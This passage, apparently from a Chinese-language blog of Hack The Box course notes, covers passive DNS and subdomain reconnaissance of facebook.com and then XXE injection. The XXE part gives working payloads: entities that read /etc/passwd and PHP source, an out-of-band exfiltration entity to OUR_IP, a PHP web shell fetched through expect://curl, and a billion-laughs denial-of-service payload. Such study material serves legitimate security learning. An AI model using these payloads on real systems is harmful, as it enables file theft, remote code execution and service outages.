&quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;google.comtext = &quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;google.comtext = &quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;google.comtext = &quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;google.comtext = &quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;google.comtext = &quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;google.comnameserver = ns3.google.com.google.comnameserver = ns2.google.com.google.comnameserver = ns1.google.com.google.comnameserver = ns4.google.com.google.commail exchanger = 10 aspmx.l.google.com.google.commail exchanger = 40 alt3.aspmx.l.google.com.google.commail exchanger = 20 alt1.aspmx.l.google.com.google.commail exchanger = 30 alt2.aspmx.l.google.com.google.commail exchanger = 50 alt4.aspmx.l.google.com.google.com    origin = ns1.google.com    mail addr = dns-admin.google.com    serial = 398195569    refresh = 900    retry = 900    expire = 1800    minimum = 60google.comrdata_257 = 0 issue &quot;pki.goog&quot;Authoritative answers can be found from:</code></pre><h4 id="Querying-TXT-Records"><a href="#Querying-TXT-Records" class="headerlink" title="Querying: TXT Records"></a>Querying: TXT Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ nslookup -query=TXT $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:facebook.comtext = &quot;v=spf1 redirect=_spf.facebook.com&quot;facebook.comtext = &quot;google-site-verification=A2WZWCNQHrGV_TWwKh6KHY90tY0SHZo_RnyMJoDaG0s&quot;facebook.comtext = &quot;google-site-verification=wdH5DTJTc9AYNwVunSVFeK0hYDGUIEOGb-RReU6pJlY&quot;Authoritative answers can be found from:</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig txt facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; txt facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 63771;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;facebook.com.                  IN      TXT;; ANSWER SECTION:facebook.com.           86400   IN      TXT     &quot;v=spf1 redirect=_spf.facebook.com&quot;facebook.com.           7200    IN      TXT     &quot;google-site-verification=A2WZWCNQHrGV_TWwKh6KHY90tY0SHZo_RnyMJoDaG0s&quot;facebook.com.           7200    IN      TXT     &quot;google-site-verification=wdH5DTJTc9AYNwVunSVFeK0hYDGUIEOGb-RReU6pJlY&quot;;; Query time: 24 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:17:46 CEST 2021;; MSG SIZE  rcvd: 249</code></pre><h4 id="Querying-MX-Records"><a href="#Querying-MX-Records" class="headerlink" title="Querying: MX Records"></a>Querying: MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ nslookup -query=MX $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:facebook.commail exchanger = 10 smtpin.vvv.facebook.com.Authoritative answers can be found from:</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; mx facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9392;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;facebook.com.                  IN      MX;; ANSWER SECTION:facebook.com.           3600    IN      MX      10 smtpin.vvv.facebook.com.;; Query time: 40 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:18:22 CEST 2021;; MSG SIZE  rcvd: 68</code></pre><h1 id="Passive-Subdomain-Enumeration"><a href="#Passive-Subdomain-Enumeration" class="headerlink" title="Passive Subdomain Enumeration"></a>Passive Subdomain Enumeration</h1><h2 id="VirusTotal"><a href="#VirusTotal" class="headerlink" title="VirusTotal"></a>VirusTotal</h2><p>VirusTotal维护其DNS复制服务，该服务是通过保留用户访问其提供的URL时所做的DNS解析来开发的。要接收有关域的信息，请在搜索栏中键入域名，然后单击“关系”选项卡。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181654870.png" alt="image"></p><h2 id="Certificates"><a href="#Certificates" class="headerlink" title="Certificates"></a>Certificates</h2><p>我们可以用来提取子域的另一个有趣的信息来源是SSL&#x2F;TLS证书。主要原因是证书透明度（CT），该项目要求证书颁发机构（CA）颁发的每个SSL&#x2F;TLS证书都发布在可公开访问的日志中。 我们将学习如何使用两种主要资源检查CT日志，以发现目标组织的其他域名和子域： </p><p><a href="https://censys.io/">https://censys.io</a> </p><p><a href="https://crt.sh/">https://crt.sh</a> </p><p>我们可以导航到<a href="https://search.censys.io/certificates%E6%88%96https://crt.sh%E5%B9%B6%E4%BB%8B%E7%BB%8D%E6%88%91%E4%BB%AC%E7%9B%AE%E6%A0%87%E7%BB%84%E7%BB%87%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%8C%E5%BC%80%E5%A7%8B%E5%8F%91%E7%8E%B0%E6%96%B0%E7%9A%84%E5%AD%90%E5%9F%9F%E3%80%82">https://search.censys.io/certificates或https://crt.sh并介绍我们目标组织的域名，开始发现新的子域。</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181659020.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181659612.png" alt="img"></p><p>尽管该网站非常优秀，但我们希望将这些信息组织起来，并能够将其与整个信息收集过程中发现的其他来源相结合。让我们向目标网站执行一个curl请求，请求JSON输出，因为这对我们来说更易于处理。我们可以通过以下命令执行此操作：</p><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ curl -s &quot;https://crt.sh/?q=$&#123;TARGET&#125;&amp;output=json&quot; | jq -r &#39;.[] | &quot;\(.name_value)\n\(.common_name)&quot;&#39; | sort -u &gt; &quot;$&#123;TARGET&#125;_crt.sh.txt&quot;</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ head -n20 facebook.com_crt.sh.txt*.adtools.facebook.com*.ak.facebook.com*.ak.fbcdn.net*.alpha.facebook.com*.assistant.facebook.com*.beta.facebook.com*.channel.facebook.com*.cinyour.facebook.com*.cinyourrc.facebook.com*.connect.facebook.com*.cstools.facebook.com*.ctscan.facebook.com*.dev.facebook.com*.dns.facebook.com*.extern.facebook.com*.extools.facebook.com*.f--facebook.com*.facebook.com*.facebookcorewwwi.onion*.facebookmail.com</code></pre><table><thead><tr><th><code>curl -s</code></th><th>Issue the request with minimal output.</th></tr></thead><tbody><tr><td><code>https://crt.sh/?q=&lt;DOMAIN&gt;&amp;output=json</code></td><td>Ask for the json output.</td></tr><tr><td><code>jq -r &#39;.[]&#39; &quot;\(.name_value)\n\(.common_name)&quot;&#39;</code></td><td>Process the json output and print certificate’s name value and common name one per line.</td></tr><tr><td><code>sort -u</code></td><td>Sort alphabetically the output provided and removes duplicates.</td></tr></tbody></table><p>我们还可以通过以下方式使用OpenSSL对目标手动执行此操作：</p><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ export PORT=&quot;443&quot;Tanin@htb[/htb]$ openssl s_client -ign_eof 2&gt;/dev/null &lt;&lt;&lt;$&#39;HEAD / HTTP/1.0\r\n\r&#39; -connect &quot;$&#123;TARGET&#125;:$&#123;PORT&#125;&quot; | openssl x509 -noout -text -in - | grep &#39;DNS&#39; | sed -e &#39;s|DNS:|\n|g&#39; -e &#39;s|^\*.*||g&#39; | tr -d &#39;,&#39; | sort -u*.facebook.com*.facebook.net*.fbcdn.net*.fbsbx.com*.m.facebook.com*.messenger.com*.xx.fbcdn.net*.xy.fbcdn.net*.xz.fbcdn.netfacebook.commessenger.com</code></pre><h2 id="Automating-Passive-Subdomain-Enumeration"><a href="#Automating-Passive-Subdomain-Enumeration" class="headerlink" title="Automating Passive Subdomain Enumeration"></a>Automating Passive Subdomain Enumeration</h2><p>我们已经学会了如何使用第三方服务从目标组织获取有用的信息，如子域、命名模式、备用TLD、IP范围等，而无需直接与其基础设施交互或依赖自动化工具。现在，我们将学习如何使用工具和以前获得的信息枚举子域。</p><h4 id="TheHarvester"><a href="#TheHarvester" class="headerlink" title="TheHarvester"></a>TheHarvester</h4><p><a href="https://github.com/laramies/theHarvester">TheHarvester</a> </p><p>Harvester是一个简单易用但功能强大且有效的工具，用于早期渗透测试和红队参与。我们可以使用它来收集信息，以帮助识别公司的攻击面。该工具从各种公共数据源收集电子邮件、名称、子域、IP地址和URL，用于被动信息收集。目前，我们将使用以下模块：</p><p>为了实现自动化，我们将创建一个名为sources.txt的文件，其中包含以下内容。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat sources.txtbaidubufferoveruncrtshhackertargetotxprojecdiscoveryrapiddnssublist3rthreatcrowdtrellourlscanvhostvirustotalzoomeye</code></pre><p>创建文件后，我们将执行以下命令从这些来源收集信息。</p><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=&quot;facebook.com&quot;Tanin@htb[/htb]$ cat sources.txt | while read source; do theHarvester -d &quot;$&#123;TARGET&#125;&quot; -b $source -f &quot;$&#123;source&#125;_$&#123;TARGET&#125;&quot;;done&lt;SNIP&gt;********************************************************************  _   _                                            _             ** | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  ** | __|  _ \ / _ \  / /_/ / _` | &#39;__\ \ / / _ \/ __| __/ _ \ &#39;__| ** | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    **  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    **                                                                 ** theHarvester 4.0.0                                              ** Coded by Christian Martorella                                   ** Edge-Security Research                                          ** cmartorella@edge-security.com                                   **                                                                 ********************************************************************[*] Target: facebook.com[*] Searching Urlscan.[*] ASNS found: 29--------------------AS12578AS13335AS13535AS136023AS14061AS14618AS15169AS15817&lt;SNIP&gt;</code></pre><p>过程结束后，我们可以提取找到的所有子域，并通过以下命令对其进行排序：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat *.json | jq -r &#39;.hosts[]&#39; 2&gt;/dev/null | cut -d&#39;:&#39; -f 1 | sort -u &gt; &quot;$&#123;TARGET&#125;_theHarvester.txt&quot;</code></pre><p>现在我们可以通过以下方式合并所有被动侦察文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat facebook.com_*.txt | sort -u &gt; facebook.com_subdomains_passive.txtTanin@htb[/htb]$ cat facebook.com_subdomains_passive.txt | wc -l11947</code></pre><h1 id="Passive-Infrastructure-Identification"><a href="#Passive-Infrastructure-Identification" class="headerlink" title="Passive Infrastructure Identification"></a>Passive Infrastructure Identification</h1><p><a href="https://www.netcraft.com/">Netcraft</a>甚至可以在不与服务器交互的情况下向我们提供有关服务器的信息，从被动信息收集的角度来看，这是有价值的。我们可以通过访问使用该服务<a href="https://sitereport.netcraft.com并进入目标域./">https://sitereport.netcraft.com并进入目标域。</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181743827.png" alt="img"></p><p>我们需要特别注意使用的最新IP。有时，我们可以在网络服务器被放置在负载均衡器、网络应用程序防火墙或IDS后面之前，从中发现实际的IP地址，从而允许我们在配置允许的情况下直接连接到它。这种技术可能会干扰或改变我们未来的测试活动。</p><h2 id="Wayback-Machine"><a href="#Wayback-Machine" class="headerlink" title="Wayback Machine"></a>Wayback Machine</h2><p>我们可以使用 <a href="http://web.archive.org/">Wayback Machine</a> 访问这些网站的几个版本，以查找在源代码或文件中可能有有趣注释的旧版本，而这些注释不应该存在。此工具可用于在某个时间点查找网站的旧版本。以一个运行WordPress的网站为例。在使用手动方法和自动化工具评估它时，我们可能找不到任何有趣的东西，所以我们使用Wayback Machine搜索它，并找到一个使用特定（现在很脆弱）插件的版本。回到网站的当前版本，我们发现插件没有被正确删除，仍然可以通过wp内容目录访问。然后我们可以利用它在主机上获得远程代码执行和丰厚的奖励。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181746630.png" alt="image"></p><p>我们还可以使用工具waybackurls来检查Wayback Machine保存的URL，并查找特定的关键字。如果我们在主机上正确设置了Go，我们可以按如下方式安装该工具：</p><p> <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a></p><pre><code class="shell-session">Tanin@htb[/htb]$ go install github.com/tomnomnom/waybackurls@latest</code></pre><p>要从域中获取带有获取日期的已爬网URL列表，我们可以在命令中添加-dates开关，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ waybackurls -dates https://facebook.com &gt; waybackurls.txtTanin@htb[/htb]$ cat waybackurls.txt2018-05-20T09:46:07Z http://www.facebook.com./2018-05-20T10:07:12Z https://www.facebook.com/2018-05-20T10:18:51Z http://www.facebook.com/#!/pages/Welcome-Baby/143392015698061?ref=tsrobots.txt2018-05-20T10:19:19Z http://www.facebook.com/2018-05-20T16:00:13Z http://facebook.com2018-05-21T22:12:55Z https://www.facebook.com2018-05-22T15:14:09Z http://www.facebook.com2018-05-22T17:34:48Z http://www.facebook.com/#!/Syerah?v=info&amp;ref=profile/robots.txt2018-05-23T11:03:47Z http://www.facebook.com/#!/Bin595</code></pre><p>如果我们想访问特定的资源，我们需要将URL放在搜索菜单中，并导航到创建快照的日期。如前所述，Wayback Machine是一种方便的工具，不应被忽视。它很可能导致我们发现被遗忘的资产、页面等，从而发现缺陷。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web attacks-XXE</title>
      <link href="/2023/09/11/web-attacks-XXE/"/>
      <url>/2023/09/11/web-attacks-XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-to-XXE"><a href="#Intro-to-XXE" class="headerlink" title="Intro to XXE"></a>Intro to XXE</h1><p>XML外部实体（XXE）注入漏洞发生在从用户控制的输入中获取XML数据时，而没有对其进行适当的清理或安全解析，这可能使我们能够使用XML功能执行恶意操作。XXE漏洞会对web应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到关闭后端服务器，这就是为什么它被OWASP认为是十大web安全风险之一。</p><span id="more"></span><p>XML文档的一些关键元素，如：</p><table><thead><tr><th>Key</th><th>Definition</th><th>Example</th></tr></thead><tbody><tr><td><code>Tag</code></td><td>The keys of an XML document, usually wrapped with (<code>&lt;</code>&#x2F;<code>&gt;</code>) characters.</td><td><code>&lt;date&gt;</code></td></tr><tr><td><code>Entity</code></td><td>XML variables, usually wrapped with (<code>&amp;</code>&#x2F;<code>;</code>) characters.</td><td><code>&lt;</code></td></tr><tr><td><code>Element</code></td><td>The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.</td><td><code>&lt;date&gt;01-01-2022&lt;/date&gt;</code></td></tr><tr><td><code>Attribute</code></td><td>Optional specifications for any element that are stored in the tags, which may be used by the XML parser.</td><td><code>version=&quot;1.0&quot;</code>&#x2F;<code>encoding=&quot;UTF-8&quot;</code></td></tr><tr><td><code>Declaration</code></td><td>Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.</td><td><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></td></tr></tbody></table><p>此外，一些字符被用作XML文档结构的一部分，如&lt;、&gt;、&amp;或“。因此，如果我们需要在XML文档中使用它们，我们应该将它们替换为相应的实体引用（例如&amp;lt；、&amp;gt；、&amp;amp；、&amp;quot；）。最后，我们可以在&lt;！–和–&gt;之间的XML文档中编写注释，类似于HTML文档。</p><h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><table><thead><tr><th><strong>Code</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>&lt;!ENTITY xxe SYSTEM &quot;http://localhost/email.dtd&quot;&gt;</code></td><td>Define External Entity to a URL</td></tr><tr><td><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></td><td>Define External Entity to a file path</td></tr><tr><td><code>&lt;!ENTITY company SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</code></td><td>Read PHP source code with base64 encode filter</td></tr><tr><td><code>&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;</code></td><td>Reading a file through a PHP error</td></tr><tr><td><code>&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;</code></td><td>Reading a file OOB exfiltration</td></tr></tbody></table><h2 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h2><p>XML文档类型定义（DTD）允许根据预定义的文档结构验证XML文档。预定义的文档结构可以在文档本身或外部文件中定义。下面是我们前面看到的XML文档的DTD示例：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ELEMENT email (date, time, sender, recipients, body)&gt;  &lt;!ELEMENT recipients (to, cc?)&gt;  &lt;!ELEMENT cc (to*)&gt;  &lt;!ELEMENT date (#PCDATA)&gt;  &lt;!ELEMENT time (#PCDATA)&gt;  &lt;!ELEMENT sender (#PCDATA)&gt;  &lt;!ELEMENT to  (#PCDATA)&gt;  &lt;!ELEMENT body (#PCDATA)&gt;]&gt;</code></pre><p>正如我们所看到的，DTD使用element类型声明来声明根电子邮件元素，然后表示其子元素。之后，每个子元素也被声明，其中一些子元素也具有子元素，而其他子元素可能仅包含原始数据（如PCDATA所示）。 上面的DTD可以放在XML文档本身中，就在第一行的XML声明之后。否则，它可以存储在一个外部文件（例如email.dtd）中，然后在XML文档中使用SYSTEM关键字引用，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email SYSTEM &quot;email.dtd&quot;&gt;</code></pre><p>也可以通过URL引用DTD，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email SYSTEM &quot;http://inlanefreight.com/email.dtd&quot;&gt;</code></pre><p>这与HTML文档定义和引用JavaScript和CSS脚本的方式相对类似。</p><h2 id="XML-Entities"><a href="#XML-Entities" class="headerlink" title="XML Entities"></a>XML Entities</h2><p>我们还可以在XML DTD中定义自定义实体（即XML变量），以允许重构变量并减少重复数据。这可以通过使用ENTITY关键字来完成，该关键字后面跟着实体名称及其值，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company &quot;Inlane Freight&quot;&gt;]&gt;</code></pre><p>一旦我们定义了一个实体，它就可以在XML文档中用&amp;和分号引用；（例如&amp;company；）。每当引用实体时，XML解析器都会将其替换为其值。然而，最有趣的是，我们可以使用SYSTEM关键字引用外部XML实体，该关键字后面跟着外部实体的路径，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;http://localhost/company.txt&quot;&gt;  &lt;!ENTITY signature SYSTEM &quot;file:///var/www/html/signature.txt&quot;&gt;]&gt;</code></pre><p>注意：我们也可以使用PUBLIC关键字而不是SYSTEM来加载外部资源，后者用于公开声明的实体和标准，例如语言代码（lang&#x3D;“en”）。</p><p>这与文档中定义的内部XML实体类似。当我们引用外部实体（例如&amp;signature；）时，解析器会用存储在外部文件中的值（例如signature.txt）替换该实体。当在服务器端解析XML文件时，在SOAP（XML）API或web表单等情况下，实体可以引用存储在后端服务器上的文件，当我们引用该实体时，最终可能会向我们披露该文件。</p><h1 id="Local-File-Disclosure"><a href="#Local-File-Disclosure" class="headerlink" title="Local File Disclosure"></a>Local File Disclosure</h1><p>当web应用程序信任来自用户输入的未过滤的XML数据时，我们可能能够引用外部XMLDTD文档并定义新的自定义XML实体。假设我们可以定义新的实体并将它们显示在网页上。在这种情况下，我们还应该能够定义外部实体，并使它们引用本地文件，当显示本地文件时，该文件应该在后端服务器上向我们显示该文件的内容。 让我们看看如何识别潜在的XXE漏洞，并利用它们从后端服务器读取敏感文件。</p><h2 id="Identifying"><a href="#Identifying" class="headerlink" title="Identifying"></a>Identifying</h2><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121003069.jpeg" alt="xxe_request" style="zoom:150%;" /><p>正如我们所看到的，该表单似乎正在以XML格式将我们的数据发送到web服务器，使其成为潜在的XXE测试目标。假设web应用程序使用过时的XML库，并且它没有对XML输入应用任何过滤器或净化。在这种情况下，我们可能能够利用这种XML表单来读取本地文件。 </p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121004984.jpeg" alt="xxe_response"></p><p>我们看到电子邮件元素的值正在页面上显示给我们。要将外部文件的内容打印到页面上，我们应该注意显示了哪些元素，这样我们就知道要注入哪些元素。在某些情况下，可能不会显示任何元素，我们将在接下来的部分中介绍如何利用这些元素。 目前，我们知道，无论我们在<email></email>元素中放置什么值，都会显示在HTTP响应中。因此，让我们尝试定义一个新的实体，然后将其用作电子邮件元素中的变量，看看它是否被我们定义的值所取代。为此，我们可以使用上一节中学到的内容来定义新的XML实体，并在XML输入的第一行之后添加以下行：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY company &quot;Inlane Freight&quot;&gt;]&gt;</code></pre><blockquote><p>注意：在我们的示例中，HTTP请求中的XML输入没有在XML数据本身中声明DTD，也没有在外部引用DTD，所以我们在定义实体之前添加了一个新的DTD。如果DOCTYPE已经在XML请求中声明，我们只需要向其中添加ENTITY元素。</p></blockquote><p>现在，我们应该有一个名为company的新XML实体，我们可以使用&amp;company；来引用它；。因此，与其在电子邮件元素中使用我们的电子邮件，不如让我们尝试使用&amp;company；，看看它是否会被我们定义的值（Inlane Freight）所取代：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121008563.jpeg" alt="new_entity"></p><p>正如我们所看到的，响应确实使用了我们定义的实体（Inlane Freight）的值，而不是显示&amp;company；，表明我们可以注入XML代码。相比之下，非易受攻击的web应用程序会将（&amp;company；）显示为原始值。这证实了我们正在处理一个易受XXE攻击的web应用程序。</p><blockquote><p>注意：有些web应用程序在HTTP请求中可能默认为JSON格式，但仍可能接受其他格式，包括XML。因此，即使web应用程序以JSON格式发送请求，我们也可以尝试将Content-Type标头更改为application&#x2F;xml，然后使用在线工具将JSON数据转换为xml。如果web应用程序确实接受了带有XML数据的请求，那么我们也可以针对XXE漏洞对其进行测试，这可能会揭示一个意想不到的XXE漏洞。</p></blockquote><h2 id="Reading-Sensitive-Files"><a href="#Reading-Sensitive-Files" class="headerlink" title="Reading Sensitive Files"></a>Reading Sensitive Files</h2><p>现在我们可以定义新的内部XML实体了，让我们看看是否可以定义外部XML实体。这样做与我们之前所做的非常相似，但我们只需添加SYSTEM关键字并在其后面定义外部引用路径，正如我们在上一节中所学到的：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</code></pre><blockquote><p>提示：在某些Java web应用程序中，我们还可以指定一个目录而不是文件，并且我们将获得一个目录列表，这对于定位敏感文件非常有用。</p></blockquote><h2 id="Reading-Source-Code"><a href="#Reading-Source-Code" class="headerlink" title="Reading Source Code"></a>Reading Source Code</h2><p>本地文件公开的另一个好处是能够获得web应用程序的源代码。这将使我们能够执行白盒渗透测试，以揭示web应用程序中的更多漏洞，或者至少揭示数据库密码或API密钥等秘密配置。 因此，让我们看看是否可以使用相同的攻击来读取index.php文件的源代码，如下所示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121012371.jpeg" alt="file_php"></p><p>正如我们所看到的，这并没有奏效，因为我们没有得到任何内容。之所以发生这种情况，是因为我们引用的文件不是正确的XML格式，因此无法将其作为外部XML实体进行引用。&#x3D;&#x3D;如果一个文件包含一些XML的特殊字符（例如&lt;&#x2F;&gt;&#x2F;&amp;），它将破坏外部实体引用，并且不用于引用。&#x3D;&#x3D;此外，我们不能读取任何二进制数据，因为它也不符合XML格式。 幸运的是，PHP提供了包装过滤器，允许我们对某些资源（包括文件）进行base64编码，在这种情况下，最终的base64输出不应破坏XML格式。为此，我们将使用PHP的php:&#x2F;&#x2F;filter&#x2F;包装。有了这个过滤器，我们可以指定convert.base64-encode编码器作为我们的过滤器，然后添加一个输入资源（例如resource&#x3D;index.php），如下所示：</p><h2 id="Remote-Code-Execution-with-XXE"><a href="#Remote-Code-Execution-with-XXE" class="headerlink" title="Remote Code Execution with XXE"></a>Remote Code Execution with XXE</h2><p>除了读取本地文件外，我们还可以通过远程服务器执行代码。最简单的方法是通过调用我们的服务器来寻找ssh密钥，或者尝试在基于Windows的web应用程序中使用哈希窃取技巧。如果这些都不起作用，我们仍然&#x3D;&#x3D;可以通过PHP:&#x2F;&#x2F;expect过滤器在基于PHP的web应用程序上执行命令&#x3D;&#x3D;，尽管这需要安装并启用PHP expect模块。 如果XXE直接打印其输出“如本节所示”，那么我们可以执行如下基本命令expect:&#x2F;&#x2F;id，并且页面应该打印命令输出。但是，如果我们无法访问输出，或者需要执行更复杂的命令“例如reverse shell”，则XML语法可能会中断，该命令可能无法执行。 将XXE转换为RCE的最有效方法是从服务器中获取一个web外壳并将其写入web应用程序，然后我们可以与它交互以执行命令。为此，我们可以先编写一个基本的PHP web shell，然后启动一个python web服务器，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;?php system($_REQUEST[&quot;cmd&quot;]);?&gt;&#39; &gt; shell.phpTanin@htb[/htb]$ sudo python3 -m http.server 80</code></pre><p>现在，我们可以使用以下XML代码来执行一个curl命令，该命令将我们的web shell下载到远程服务器：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;expect://curl$IFS-O$IFS&#39;OUR_IP/shell.php&#39;&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&lt;/name&gt;&lt;tel&gt;&lt;/tel&gt;&lt;email&gt;&amp;company;&lt;/email&gt;&lt;message&gt;&lt;/message&gt;&lt;/root&gt;</code></pre><blockquote><p>注意：我们用$IFS替换了上面XML代码中的所有空格，以避免破坏XML语法。此外，许多其他字符（如|、&gt;和{）可能会破坏代码，因此我们应该避免使用它们。</p></blockquote><p>注意：expect模块在现代PHP服务器上默认不会启用&#x2F;安装，因此这种攻击可能并不总是有效的。这就是为什么XXE通常用于披露敏感的本地文件和源代码，这可能会揭示额外的漏洞或获得代码执行的方式。</p><h2 id="Other-XXE-Attacks"><a href="#Other-XXE-Attacks" class="headerlink" title="Other XXE Attacks"></a>Other XXE Attacks</h2><p>另一种经常通过XXE漏洞进行的常见攻击是SSRF利用，该漏洞用于枚举本地打开的端口，并通过XXE弱点访问其页面和其他受限网页。服务器端攻击模块完全涵盖了SSRF，XXE攻击也可以采用相同的技术。 最后，XXE攻击的一个常见用途是对托管web服务器造成拒绝服务（DOS），使用以下有效载荷：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY a0 &quot;DOS&quot; &gt;  &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;  &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;  &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;  &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;  &lt;!ENTITY a5 &quot;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&quot;&gt;  &lt;!ENTITY a6 &quot;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&quot;&gt;  &lt;!ENTITY a7 &quot;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&quot;&gt;  &lt;!ENTITY a8 &quot;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&quot;&gt;  &lt;!ENTITY a9 